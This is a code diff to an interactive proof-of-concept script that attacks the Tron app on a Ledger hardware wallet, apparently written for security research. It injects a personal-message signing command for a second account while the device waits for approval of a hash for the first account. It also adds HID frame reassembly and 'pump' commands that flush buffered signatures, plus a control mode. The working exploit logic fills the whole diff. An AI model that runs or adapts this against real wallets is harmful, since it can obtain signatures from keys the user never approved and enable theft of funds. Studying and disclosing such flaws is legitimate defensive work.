@@ -50,7 +50,7 @@ import time
 import threading
 
 from ledgerblue.comm import getDongle
-from ledgerblue.ledgerWrapper import unwrapResponseAPDU, wrapCommandAPDU
+from ledgerblue.ledgerWrapper import wrapCommandAPDU
 from eth_keys import KeyAPI
 
 from base import apduMessage, parse_bip32_path
@@ -59,6 +59,7 @@ from base import apduMessage, parse_bip32_path
 INS_GET_PUBLIC_KEY = 0x02
 INS_SIGN = 0x04
 INS_SIGN_TXN_HASH = 0x05
+INS_GET_APP_CONFIGURATION = 0x06
 INS_SIGN_PERSONAL_MESSAGE = 0x08
 
 # GET_PUBLIC_KEY P1
@@ -91,6 +92,9 @@ class HidInterleaveChannel:
         # underlying hidapi handle.
         self._hid = getattr(dongle, "device", None)
         self.debug = debug
+        self._rx_payload = bytearray()
+        self._rx_expected = None
+        self._rx_next_seq = 0
         if self._hid is None or not getattr(dongle, "ledger", False):
             raise SystemExit(
                 "This PoC requires a USB HID Ledger device. TCP/BLE proxies "
@@ -111,27 +115,69 @@ class HidInterleaveChannel:
     def receive(self, timeout=45.0):
         """Reassemble one response, or None if nothing arrives in `timeout`.
 
-        Tolerant of a desynced stream: if reassembly raises (stray channel /
-        sequence) the buffer is reset so the next frame can start a fresh APDU.
+        Parses the Ledger HID framing directly so a long response can span
+        multiple frames without being discarded mid-reassembly.
         """
         self._hid.set_nonblocking(True)
         deadline = time.time() + timeout
-        data = b""
         while True:
             frame = self._hid.read(65)
             if frame:
-                data += bytes(bytearray(frame))
+                frame = bytes(bytearray(frame))
                 if self.debug:
-                    print("    HID <= {}".format(bytes(bytearray(frame)).hex()))
-                try:
-                    response = unwrapResponseAPDU(HID_CHANNEL, bytearray(data),
-                                                  HID_PACKET)
-                except Exception:
-                    data = b""
+                    print("    HID <= {}".format(frame.hex()))
+                if len(frame) < 5:
                     continue
-                if response is not None:
-                    status = (response[-2] << 8) | response[-1]
-                    return bytes(response[:-2]), status
+                if frame[0:2] != b"\x01\x01" or frame[2] != 0x05:
+                    self._rx_payload.clear()
+                    self._rx_expected = None
+                    self._rx_next_seq = 0
+                    continue
+
+                seq = (frame[3] << 8) | frame[4]
+                if seq == 0:
+                    if len(frame) < 7:
+                        continue
+                    self._rx_expected = (frame[5] << 8) | frame[6]
+                    self._rx_payload = bytearray(frame[7:])
+                    self._rx_next_seq = 1
+                    if self.debug:
+                        print("    RX state: start expected={} payload={}".format(
+                            self._rx_expected, len(self._rx_payload)))
+                else:
+                    if seq != self._rx_next_seq:
+                        if self.debug:
+                            print("    RX state: seq mismatch got={} expected={} -> reset".format(
+                                seq, self._rx_next_seq))
+                        self._rx_payload.clear()
+                        self._rx_expected = None
+                        self._rx_next_seq = 0
+                        continue
+                    self._rx_payload.extend(frame[5:])
+                    self._rx_next_seq += 1
+                    if self.debug:
+                        print("    RX state: cont seq={} payload={}".format(
+                            seq, len(self._rx_payload)))
+
+                if self._rx_expected is None:
+                    continue
+                if len(self._rx_payload) < self._rx_expected:
+                    if self.debug:
+                        print("    RX state: waiting payload={}/{}".format(
+                            len(self._rx_payload), self._rx_expected))
+                    continue
+
+                payload = bytes(self._rx_payload[:self._rx_expected])
+                self._rx_payload = bytearray(self._rx_payload[self._rx_expected:])
+                self._rx_expected = None
+                self._rx_next_seq = 0
+                if len(payload) < 2:
+                    continue
+                status = (payload[-2] << 8) | payload[-1]
+                if self.debug:
+                    print("    RX state: complete data={} sw=0x{:04x}".format(
+                        len(payload) - 2, status))
+                return payload[:-2], status
             else:
                 time.sleep(HID_POLL_INTERVAL)
             if time.time() >= deadline:
@@ -172,6 +218,33 @@ def personal_message_first_apdu(path, declared_len, chunk):
     body = declared_len.to_bytes(4, "big").hex() + chunk.hex()
     return apduMessage(INS_SIGN_PERSONAL_MESSAGE, P1_FIRST, 0x00,
                        parse_bip32_path(path), body)
+
+
+def app_config_apdu():
+    """A harmless GET_APP_CONFIGURATION used only to pump the io loop."""
+    return apduMessage(INS_GET_APP_CONFIGURATION, 0x00, 0x00, "", "")
+
+
+def flush_after_approval(channel, max_pumps=3):
+    """Force the device to flush a queued async reply.
+
+    Some hardware paths only release the buffered signature on a later APDU
+    exchange, so keep issuing a harmless ``GET_APP_CONFIGURATION`` until we see
+    a signature or run out of retries. Keep every reply and let the caller
+    classify by size/content.
+    """
+    flushed = []
+    for _ in range(max_pumps):
+        channel.send(app_config_apdu())
+        batch = channel.drain(quiet=3.0)
+        if batch:
+            flushed.extend(batch)
+            if any(status == SW_OK and len(data) >= 65 for data, status in batch):
+                break
+        else:
+            # No reply at all yet; give the device another chance to flush.
+            continue
+    return flushed
 
 
 ###############################################################################
@@ -266,6 +339,13 @@ def run_addr(channel, dongle, path_a, path_b):
         raise approval_state["error"]
 
     post = approval_state["replies"]
+    if not post:
+        # The device buffered the approval reply; pump the io loop to flush it.
+        post = flush_after_approval(channel)
+    elif not any(status == SW_OK and len(data) >= 65 for data, status in post):
+        # We got a reply, but not a signature yet; keep pumping in case the
+        # signature is still buffered behind the visible reply.
+        post.extend(flush_after_approval(channel))
     show_replies("post-approval reply", post)
 
     replies = pre + post
@@ -292,8 +372,12 @@ def run_addr(channel, dongle, path_a, path_b):
         print("\nInconclusive: unexpected address(es) returned.")
 
 
-def run_keysub(channel, dongle, path_a, path_b):
+def run_keysub(channel, dongle, path_a, path_b, inject=True):
     print("== Scenario: signing-key substitution (needs 'Sign by hash') ==")
+    if not inject:
+        print("   [CONTROL RUN: injection disabled -- this is just a plain "
+              "sign-by-hash\n   over the split-HID channel, to check the "
+              "channel can carry an\n   approval-gated signature at all.]")
     ref_pk_a, addr_a = query_reference_key(dongle, path_a)
     ref_pk_b, addr_b = query_reference_key(dongle, path_b)
     digest = hashlib.sha256(b"tron toctou hardware poc").digest()
@@ -306,10 +390,13 @@ def run_keysub(channel, dongle, path_a, path_b):
     prompt("Check the device: it should be reviewing a transaction/hash for "
            "account A.\n    Do NOT approve yet.")
 
-    print("Injecting SIGN_PERSONAL_MESSAGE first-chunk for account B...")
-    channel.send(
-        personal_message_first_apdu(path_b, declared_len=64,
-                                    chunk=b"\xaa" * 8))
+    if inject:
+        print("Injecting SIGN_PERSONAL_MESSAGE first-chunk for account B...")
+        channel.send(
+            personal_message_first_apdu(path_b, declared_len=64,
+                                        chunk=b"\xaa" * 8))
+    else:
+        print("(control) NOT injecting; expecting account A's own signature.")
     # On hardware the injected 0x9000 and the eventual signature may arrive in
     # either order, so don't assume: drain before and after approval and pick
     # out the 65-byte signature by content.
@@ -332,6 +419,9 @@ def run_keysub(channel, dongle, path_a, path_b):
         raise approval_state["error"]
 
     post = approval_state["replies"]
+    if not post:
+        # The device buffered the approval reply; pump the io loop to flush it.
+        post = flush_after_approval(channel)
     show_replies("post-approval reply", post)
 
     replies = pre + post
@@ -372,6 +462,11 @@ def main():
                         help="injected account (default 44'/195'/1'/0/0)")
     parser.add_argument("--debug", action="store_true",
                         help="log every raw HID frame sent and received")
+    parser.add_argument("--no-inject", action="store_true",
+                        help="keysub CONTROL run: skip the injected APDU, just "
+                             "do a plain sign-by-hash over the split-HID "
+                             "channel to confirm it can carry an approval-gated "
+                             "signature at all")
     args = parser.parse_args()
 
     print("-= Tron Ledger =- TOCTOU interleave PoC (HARDWARE, interactive)")
@@ -380,7 +475,11 @@ def main():
     dongle = getDongle(args.debug)
     try:
         channel = HidInterleaveChannel(dongle, debug=args.debug)
-        SCENARIOS[args.scenario](channel, dongle, args.path_a, args.path_b)
+        if args.scenario == "keysub":
+            run_keysub(channel, dongle, args.path_a, args.path_b,
+                       inject=not args.no_inject)
+        else:
+            SCENARIOS[args.scenario](channel, dongle, args.path_a, args.path_b)
     finally:
         dongle.close()
 
